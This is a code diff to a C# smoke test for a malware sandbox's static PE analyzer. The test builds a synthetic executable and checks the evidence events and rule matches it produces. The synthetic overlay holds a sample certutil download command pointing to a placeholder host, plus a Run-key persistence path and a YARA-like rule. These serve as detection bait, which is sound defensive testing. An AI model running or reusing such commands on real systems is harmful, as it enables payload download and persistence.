@@ -1,3 +1,5 @@
+using KSword.Sandbox.Abstractions;
+using KSword.Sandbox.Core.Rules;
 using KSword.Sandbox.Core.StaticAnalysis;
 using KSword.Sandbox.SmokeTests.Assertions;
 using KSword.Sandbox.SmokeTests.Framework;
@@ -21,10 +23,12 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
 
         var staticRoot = Path.Combine(context.RuntimeRoot, "static-pe-evidence");
         Directory.CreateDirectory(staticRoot);
+        WriteLocalStaticYaraRules(staticRoot);
         var samplePath = Path.Combine(staticRoot, "overlay-signed.exe");
         WriteOverlaySignedPe(samplePath);
 
-        var result = new StaticAnalyzer().Analyze(samplePath);
+        var analyzer = new StaticAnalyzer();
+        var result = analyzer.Analyze(samplePath);
         AssertTags(
             result.Tags,
             "pe32_plus",
@@ -58,7 +62,12 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
             "registry_path_string",
             "run_key_path_string",
             "windows_path_string",
-            "lolbin_string");
+            "lolbin_string",
+            "packer_hint",
+            "packer_string_hint",
+            "packer_upx",
+            "static.yara.match",
+            "static.yara.engine.builtin");
         SmokeAssert.True(
             result.Sections.Any(section =>
                 string.Equals(section.Name, ".text", StringComparison.OrdinalIgnoreCase) &&
@@ -127,12 +136,157 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
             result.Urls.Any(value => value.StartsWith("https://overlay.example.invalid/", StringComparison.OrdinalIgnoreCase)),
             "StaticAnalyzer should extract URL strings from overlay bytes.");
 
+        var projectedEvents = analyzer.AnalyzeToEvents(samplePath);
+        AssertProjectedStaticEvents(projectedEvents);
+        AssertProjectedStaticRuleConsumption(context, projectedEvents);
+
         return Task.FromResult(new SmokeTestResult
         {
             ScenarioId = ScenarioId,
             Passed = true,
-            Message = "Static analyzer emits structured PE, overlay, signature, URL/IP/email, path, and command evidence."
+            Message = "Static analyzer emits structured PE, overlay, signature, URL/IP/email, path, command, packer, and YARA-like event evidence."
         });
+    }
+
+    /// <summary>
+    /// Asserts that static-analysis event projection exposes rule-consumable
+    /// event rows for the major PE, string, packer, and YARA-like signals.
+    /// </summary>
+    private static void AssertProjectedStaticEvents(IReadOnlyList<SandboxEvent> events)
+    {
+        var summary = RequireEvent(events, "static.analysis.completed");
+        RequireData(summary, "zhMessage");
+        RequireData(summary, "zhHint");
+
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.section", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "name", ".text") &&
+                evt.Data.ContainsKey("entropy")),
+            "StaticAnalyzer should project section entropy events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.import.module", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "moduleName", "KERNEL32.dll") &&
+                DataContains(evt, "apiNames", "WriteProcessMemory")),
+            "StaticAnalyzer should project PE import module/API events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.import.cluster", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "cluster", "process-injection") &&
+                DataContains(evt, "tags", "import_process_injection_api")),
+            "StaticAnalyzer should project suspicious import cluster events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.export", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "exportName", "DllRegisterServer") &&
+                DataContains(evt, "tags", "export_registration_entrypoint")),
+            "StaticAnalyzer should project export-name events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.tls.callback", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "virtualAddress", "0x140001010")),
+            "StaticAnalyzer should project TLS callback events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.pe.overlay", StringComparison.OrdinalIgnoreCase) &&
+                DataContains(evt, "tags", "overlay_high_entropy")),
+            "StaticAnalyzer should project PE overlay events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.string.indicator", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "kind", "url") &&
+                DataContains(evt, "value", "overlay.example.invalid")),
+            "StaticAnalyzer should project suspicious string/network indicator events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.string.command", StringComparison.OrdinalIgnoreCase) &&
+                DataEquals(evt, "category", "lolbin") &&
+                DataEquals(evt, "tool", "certutil")),
+            "StaticAnalyzer should project command/LOLBIN string events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.packer.hint", StringComparison.OrdinalIgnoreCase) &&
+                DataContains(evt, "tags", "packer_upx")),
+            "StaticAnalyzer should project packer hint events.");
+        SmokeAssert.True(
+            events.Any(evt =>
+                string.Equals(evt.EventType, "static.yara.match", StringComparison.OrdinalIgnoreCase) &&
+                evt.Data.ContainsKey("ruleName") &&
+                DataEquals(evt, "engine", "builtin") &&
+                evt.Data.ContainsKey("zhHint")),
+            "StaticAnalyzer should project lightweight YARA-like rule match events.");
+    }
+
+    /// <summary>
+    /// Asserts that behavior rules consume granular static.* events rather than
+    /// depending only on the legacy static.analysis.completed summary row.
+    /// </summary>
+    private static void AssertProjectedStaticRuleConsumption(
+        SmokeTestContext context,
+        IReadOnlyList<SandboxEvent> events)
+    {
+        var granularEvents = events
+            .Where(evt => !string.Equals(evt.EventType, "static.analysis.completed", StringComparison.OrdinalIgnoreCase))
+            .ToList();
+        SmokeAssert.True(granularEvents.Count > 0, "Static event projection should include granular static.* rows.");
+
+        var rules = RuleEngine.LoadRuleSet(Path.Combine(context.RulesDirectory, "behavior-rules.json"));
+        var findings = new RuleEngine(rules).Classify(granularEvents);
+        var findingIds = findings.Select(finding => finding.RuleId).ToHashSet(StringComparer.OrdinalIgnoreCase);
+        foreach (var expectedRuleId in new[]
+        {
+            "static-import-process-injection",
+            "static-import-network-api",
+            "static-pe-tls-callbacks",
+            "static-export-registration-entrypoint",
+            "static-embedded-url",
+            "static-ip-address",
+            "static-registry-path-string",
+            "static-script-command-string",
+            "static-yara-match-observed"
+        })
+        {
+            SmokeAssert.True(
+                findingIds.Contains(expectedRuleId),
+                $"Granular static.* evidence should match behavior rule '{expectedRuleId}' without the summary event.");
+        }
+    }
+
+    /// <summary>
+    /// Returns the first event of a requested type.
+    /// </summary>
+    private static SandboxEvent RequireEvent(IEnumerable<SandboxEvent> events, string eventType)
+    {
+        var evt = events.FirstOrDefault(candidate => string.Equals(candidate.EventType, eventType, StringComparison.OrdinalIgnoreCase));
+        SmokeAssert.True(evt is not null, $"Expected event '{eventType}'.");
+        return evt!;
+    }
+
+    /// <summary>
+    /// Requires that an event data key exists.
+    /// </summary>
+    private static void RequireData(SandboxEvent evt, string key)
+    {
+        SmokeAssert.True(evt.Data.ContainsKey(key), $"{evt.EventType} should contain data.{key}.");
+    }
+
+    /// <summary>
+    /// Tests event data equality.
+    /// </summary>
+    private static bool DataEquals(SandboxEvent evt, string key, string expected)
+    {
+        return evt.Data.TryGetValue(key, out var actual) &&
+            string.Equals(actual, expected, StringComparison.OrdinalIgnoreCase);
+    }
+
+    /// <summary>
+    /// Tests whether an event data value contains one fragment.
+    /// </summary>
+    private static bool DataContains(SandboxEvent evt, string key, string expected)
+    {
+        return evt.Data.TryGetValue(key, out var actual) &&
+            actual.Contains(expected, StringComparison.OrdinalIgnoreCase);
     }
 
     /// <summary>
@@ -147,6 +301,33 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
         {
             SmokeAssert.True(tagSet.Contains(tag), $"StaticAnalyzer should emit tag '{tag}'.");
         }
+    }
+
+    /// <summary>
+    /// Writes a local lightweight YARA-like rule file under the synthetic
+    /// fixture root so event projection has deterministic rule-hit coverage
+    /// even when tests run outside the repository root.
+    /// </summary>
+    private static void WriteLocalStaticYaraRules(string root)
+    {
+        var rulesDirectory = Path.Combine(root, "rules");
+        Directory.CreateDirectory(rulesDirectory);
+        File.WriteAllText(
+            Path.Combine(rulesDirectory, "static-notes.yar"),
+            """
+            rule KSwordSandbox_Smoke_Static_EventProjection
+            {
+                meta:
+                    description = "Smoke coverage for built-in static YARA-like match events"
+                    scope = "smoke"
+                    mitre = "T1105"
+                strings:
+                    $url = "overlay.example.invalid" ascii nocase
+                    $api = "WriteProcessMemory" ascii
+                condition:
+                    any of them
+            }
+            """);
     }
 
     /// <summary>
@@ -200,7 +381,7 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
         WriteSyntheticTlsDirectory(buffer);
         WriteSyntheticImportTable(buffer);
 
-        var overlayText = "https://overlay.example.invalid/payload 9.9.9.9 ops@example.invalid HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KswordSmoke certutil.exe -urlcache -split -f http://example.invalid/a C:\\Users\\Public\\AppData\\Local\\Temp\\payload.exe";
+        var overlayText = "https://overlay.example.invalid/payload 9.9.9.9 ops@example.invalid HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KswordSmoke certutil.exe -urlcache -split -f http://example.invalid/a C:\\Users\\Public\\AppData\\Local\\Temp\\payload.exe UPX!";
         var overlayBytes = System.Text.Encoding.ASCII.GetBytes(overlayText);
         overlayBytes.CopyTo(buffer.AsSpan(0x410, overlayBytes.Length));
 
